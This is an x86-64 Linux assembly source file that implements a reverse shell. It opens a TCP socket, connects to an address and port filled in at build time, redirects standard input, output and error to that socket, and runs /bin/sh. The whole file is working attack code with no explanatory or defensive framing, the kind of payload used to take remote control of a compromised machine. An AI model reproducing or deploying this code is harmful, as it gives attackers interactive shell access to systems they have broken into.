; .intel_syntax noprefix
global _start

%define SC_close 0x03
%define SC_dup2 0x21
%define SC_socket 0x29
%define SC_connect 0x2A
%define SC_execve 0x3B
%define SC_exit 0x3C


%macro exit 1
	mov rax, SC_exit
	mov rdi, %1
	syscall
%endmacro

%macro dup2 2
	mov rax, SC_dup2
	mov rdi, %1
	mov rsi, %2
	syscall
%endmacro


struc addr_in
	.fam resw 1
	.port resw 1
	.addr resd 1
	.p resd 2
endstruc

; rdi, rsi, rdx
section .text
_start:
	mov rax, SC_socket
	mov rdi, 2		; AF_INET
	mov rsi, 1		; SOCK_STREAM
	mov rdx, 0
	syscall 		; socket(AF_INET, SOCK_STREAM, 0)
	test rax, rax		; if socket(...) < -1
	js quit			; { return 1; }
	mov [abs s], rax	; s = socket(...)

	mov rdi, rax
	mov rax, SC_connect
	lea rsi, addr
	mov rdx, addr_size
	syscall
	test rax, rax
	js close_quit

	dup2 [abs s], 0
	dup2 [abs s], 1
	dup2 [abs s], 2

	mov rax, SC_execve
	lea rdi, sh
	mov rsi, 0
	mov rdx, 0
	syscall

close_quit:
	mov rax, SC_close
	mov rdi, [abs s]
	syscall
quit:
	exit 0

section .bss
	s resd 1

section .data
	sh db "/bin/sh",0,0
	addr:
	istruc addr_in
		at addr_in.fam, dw 2
		at addr_in.port,  dw PORT
		at addr_in.addr, dd ADDR
		at addr_in.p, dd 0
	iend
	addr_size equ $ - addr
